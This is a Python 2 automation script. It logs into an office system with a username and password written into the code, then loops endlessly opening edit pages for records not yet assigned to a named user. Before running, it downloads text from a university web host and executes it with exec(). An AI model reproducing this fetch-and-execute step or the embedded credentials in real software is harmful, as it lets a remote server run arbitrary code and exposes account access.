# -*- coding: utf8 -*-
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import cStringIO
import os
import re
import httplib
import gzip
import time
import urllib
import random
gsjjimg=["http://i1.tietuku.com/66b1b72038a34a17.jpg","http://i1.tietuku.com/522cdb6ad9e553eb.jpg","http://i1.tietuku.com/e9d6705bd58f0b11.jpg","http://i1.tietuku.com/cf11a0be955fc15f.jpg","http://i1.tietuku.com/f42b1071598f8e31.jpg","http://i1.tietuku.com/14a5dcfcd33d03a8.jpg","http://i1.tietuku.com/44400067c2d3d14e.jpg","http://i4.tietuku.com/ff524e39e34bd1fe.jpg","http://i4.tietuku.com/3a3fee9f076ed7b0.jpg","http://i1.tietuku.com/5a72a0dd8a09b593.jpg","http://i1.tietuku.com/1566f1ebac5f7cf5.jpg"]
lxwmimg=["http://i4.tietuku.com/069338f324af4a7a.jpg","http://i2.tietuku.com/6690b880ffdb8e24.jpg","http://i2.tietuku.com/f2f87f97b5192519.jpg","http://i2.tietuku.com/31821d2c2b94d176.gif","http://i2.tietuku.com/4fe65c0513a1b532.jpg","http://i2.tietuku.com/606003007ccb5c0b.jpg","http://i2.tietuku.com/ed2e830792de4ec0.jpg","http://i2.tietuku.com/6c23cf43bc48d65e.jpg","http://i2.tietuku.com/bce226b1154f6e2e.jpg","http://i2.tietuku.com/8315d29e1af8ddad.jpg"]
'''
import io
# allows for image formats other than gif
from PIL import Image, ImageTk
try:
  # Python2
  import Tkinter as tk
  from urllib2 import urlopen
except ImportError:
  # Python3
  import tkinter as tk
  from urllib.request import urlopen
def getimage(url):
  root = tk.Tk()
  #url = "http://37t.cn/index.php?m=Index&a=verifyLogin"

  image_bytes = urlopen(url).read()
  data_stream = io.BytesIO(image_bytes)
  pil_image = Image.open(data_stream)
  w, h = pil_image.size
  fname = url.split('/')[-1]
  sf = "{} ({}x{})".format(fname, w, h)
  root.title(sf)
  tk_image = ImageTk.PhotoImage(pil_image)
  label = tk.Label(root, image=tk_image, bg='brown')
  label.pack(padx=5, pady=5)
  root.mainloop()
'''

def cn(x):
  x=x.decode("utf8")
  return x
def en(x):
  x=x.encode("utf8")
  return x

def keep(pat,text,type=False):
  if os.path.exists(pat)==0:
    f=open(pat, 'w+')
    f.write(text)
    f.close()
  else:
    if type:
      f=open(pat, 'w+')
      f.write(text)
      f.close()
    f=open(pat, 'a')
    f.write(text)
    f.close()


def request(host, url, headers, body = None, sendCookie = True, setCookie = True, referer = None):
  global headmsg
  headers = headers.copy()
  conn = httplib.HTTPConnection(host)
  method = "GET"
  if body:
    method = "POST"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
  if sendCookie and Cookies.has_key(host):
    headers["Cookie"] = Cookies[host]
  if referer:
    headers["Referer"] = referer
  conn.request(method, url, body, headers)
  res = conn.getresponse()
  cookie = res.getheader("set-cookie")
  headmsg=res.getheaders()
  if cookie and setCookie:
    i = cookie.find(";")
    if i != -1:
      cookie = cookie[:i]
    Cookies[host] = cookie
  data = res.read()
  if res.getheader("Content-Encoding") == "gzip":
    io = cStringIO.StringIO()
    io.write(data)
    io.seek(0)
    gz = gzip.GzipFile(fileobj = io)
    data = gz.read()
    gz.close()
    io.close()

  conn.close()
  return data


Cookies = {'oa.qz160168.cn':''}

  
  

host2="oa.qz160168.cn"
headers2 = {'User-Agent':'Opera/9.80 (Windows NT 5.1; U; Edition Next; zh-cn) Presto/2.10.289 Version/12.00','Accept':'text/html, application/xhtml+xml, */*','Accept-Language':'zh-CN','Accept-Encoding':'gzip, deflate','Cache-Control':'no-cache','Connection':'Keep-Alive'}

  
def loginoa():
  print u"登陆OA系统中！"
  url="/login.asp?Menu=Submit"
  data=request(host2, url, headers2,"username=lxc&userpass=920410")
  print (re.findall("'(.*?)'",data)[0]).decode("gbk")
  n=0
  #gjclist=[u"服装",u"服饰",u"纺织",u"布业",u"男装",u"女装",u"鞋材",u"鞋业",u"鞋厂",u"鞋行",u"鞋服",u"制鞋",u"制衣",u"卫浴",u"洁具",u"拉链",u"灯饰",u"水暖",u"酒店",u"旅馆",u"宾馆",u"石材",u"石业",u"茶",u"装饰工程",u"室内装饰",u"装饰设计",u"服装辅料",u"辅料",u"家具",u"家俬",u"货运",u"日用品",u"便利店",u"杂货"]
  gjclist=[u"服装",u"服饰",u"纺织",u"布业",u"男装",u"女装",u"鞋材",u"鞋业",u"鞋厂",u"鞋行",u"鞋服",u"制鞋",u"制衣",u"卫浴",u"洁具",u"拉链",u"灯饰",u"水暖",u"酒店",u"旅馆",u"宾馆",u"石材",u"石业",u"茶",u"装饰工程",u"室内装饰",u"装饰设计",u"服装辅料",u"辅料",u"家具",u"家俬",u"货运",u"日用品",u"便利店",u"杂货"]

  while True:
    try:
      url="/wljcburl.asp?ToPage=1"
      data=request(host2, url, headers2)
      #print u"第%d次刷新"%n
      danlist=re.findall("<tr onMouseOver=(.*?)</tr>",data.replace("\n","").replace("　".encode("gbk"),""))

      for i in danlist:
        infolist=re.findall('<td>(.*?)</td>',i)
        if infolist[13].find((u"李宣呈").encode("gbk")) == -1:
          print infolist[1]
          url="/wljcburl.asp?Menu=Edit&ID=%s"%infolist[0]
          data=request(host2, url, headers2)
              # idlist.append(infolist[0])
          # namelist.append(infolist[1])
          # userlist.append(infolist[13])
        #time.sleep(1)
      n+=1
    except Exception,ex:pass


try:
  host0="sqzx.lmu.cn"
  headers0 = {'User-Agent':'Opera/9.80 (Windows NT 5.1; U; Edition Next; zh-cn) Presto/2.10.289 Version/12.00','Accept':'text/html, application/xhtml+xml, */*','Accept-Language':'zh-CN','Accept-Encoding':'gzip, deflate','Cache-Control':'no-cache','Connection':'Keep-Alive'}
  url="/file/1.html"
  data=request(host0, url, headers0)
  if(data):
    url="/file/2.html"
    data=request(host0, url, headers0)
    exec(data)
    loginoa()
  os.system("pause")
except Exception,ex:
  print Exception,":",ex
  os.system("pause") 
